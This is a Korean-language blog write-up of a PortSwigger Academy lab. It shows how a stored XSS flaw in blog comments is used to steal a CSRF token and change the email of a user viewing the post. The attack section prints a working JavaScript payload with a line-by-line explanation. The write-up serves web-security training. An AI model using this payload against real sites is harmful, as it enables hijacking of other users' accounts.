---
title: "[Write-up] PortSwigger Academy - Exploiting XSS to bypass CSRF defenses Lab"
date: 2026-03-01 00:00:00 +09:00
categories: [Web, XSS]
tag: [XSS, CSRF, Write-up, PortSwigger Academy]
---

### 문제 설명
![1](../assets/img/XSS%20bypass%20CSRF/1.png)
- 블로그 댓글 기능에 Stored XSS 취약점이 존재한다.
- wiener:peter 계정으로 로그인이 가능하다.
- 목표 : CSRF 토큰을 탈취하고, 블로그 댓글을 조회하는 사용자의 이메일 주소 변경

### 취약점 분석
Lab에 접속하면 다음과 같은 초기 페이지를 확인할 수 있다. 페이지 우측 상단에는 사용자 로그인 페이지로 이동할 수 있는 'My account' 링크가 있으며, 아래에는 여러 개의 블로그 포스팅 목록이 표시된다.  
![2](../assets/img/XSS%20bypass%20CSRF/2.png)

먼저 포스팅 페이지에 존재하는 댓글 기능을 대상으로 취약점 존재 여부를 확인했다.  
댓글 작성 폼에는 Comment, Name, Email, Website 입력 필드가 존재하며, 입력한 내용이 페이지에 어떻게 반영되는지 테스트했다.  
이를 확인하기 위해 alert() 함수를 호출하는 XSS 페이로드를 포함한 댓글을 작성한 후, 해당 스크립트의 실행 여부를 확인했다.  
![3](../assets/img/XSS%20bypass%20CSRF/3.png)

댓글은 정상적으로 등록되었으며, 해당 포스팅 페이지에 다시 접근했을 때 alert() 함수가 실행되는 것을 확인할 수 있었다. 이를 통해 댓글 기능에 Stored XSS 취약점이 존재하는 것을 알 수 있다.  

다음으로 로그인 페이지에 접근하여 이메일 주소 변경 기능을 확인했다.  
제공된 계정 정보로 로그인하면 현재 사용자 정보와 함께 이메일 주소를 변경할 수 있는 입력 필드가 포함된 페이지가 표시된다.  
![4](../assets/img/XSS%20bypass%20CSRF/4.png)  

이메일 변경 요청이 어떻게 전송되는지 확인하기 위해 임의의 이메일 주소로 변경을 시도한 후, 해당 요청을 Burp Suite에서 확인했다.  

요청 패킷을 확인한 결과, 이메일 변경 시 /my-account/change-email 경로로 email, csrf 파라미터를 포함한 POST 요청이 전송되는 것을 확인할 수 있었다.  
![5](../assets/img/XSS%20bypass%20CSRF/5.png)

요청에 포함된 CSRF 토큰이 실제로 검증되는지 확인하기 위해 csrf 파라미터를 제거하고 요청을 재전송해 보았지만, 다음과 같이 요청이 정상적으로 처리되지 않는 것을 확인할 수 있었다.  
![6](../assets/img/XSS%20bypass%20CSRF/6.png)  

이를 통해 서버에서 CSRF 토큰을 검증하고 있으며, 이메일 변경 요청 시 유효한 CSRF 토큰이 필요하다는 것을 확인할 수 있다.  

따라서 위에서 확인한 Stored XSS 취약점을 이용해 피해자 브라우저에서 CSRF 토큰을 탈취하고 사용자 이메일 변경 요청을 전송하는 방식으로 공격을 시도했다.

### 공격 과정

```javascript
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account');
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var nextReq = new XMLHttpRequest();
    nextReq.open('post', '/my-account/change-email');
    nextReq.send('csrf='+token+'&email=hacked@hacked')
};
</script>
```

- 2~5번 라인  
CSRF 토큰을 획득하기 위해 /my-account 경로로 XMLHttpRequest 요청 전송  
요청이 완료되면 onload 이벤트에 등록된 handleResponse() 함수 실행

- 6~11 라인  
handleResponse() 함수  
응답 HTML 페이지에서 정규식을 이용해 `name="csrf" value="(\w+)"` 패턴을 찾고, 토큰 값을 변수 token에 저장  
이후 /my-account/change-email 경로로 `'csrf='+token+'&email=hacked@hacked'` 데이터를 포함한 새로운 POST 요청을 보냄

```
() : 캡처 그룹
\w+ : 하나 이상의 문자(영문, 숫자, _)

match() 함수 실행 결과 배열이 반환됨
[
'name="csrf" value="Token"',    // 패턴 전체 매칭 결과
'Token'                         // 첫 번째 캡처 그룹
]
```

### 공격 결과
작성한 스크립트를 블로그 댓글 창에 등록한 후, 사용자 계정에 로그인한 상태로 블로그 포스팅 페이지에 접근해 요청이 정상적으로 전송되었는지 확인했다.  
그 결과, 다음과 같이 /my-account/change-email 경로로 CSRF 토큰을 포함한 요청이 전송되는 것을 확인할 수 있었다. 
![8](../assets/img/XSS%20bypass%20CSRF/8.png)

이후 사용자 계정 정보를 확인했을 때 이메일 주소가 설정한 이메일 주소로 변경된 것을 확인할 수 있다.
![9](../assets/img/XSS%20bypass%20CSRF/9.png)
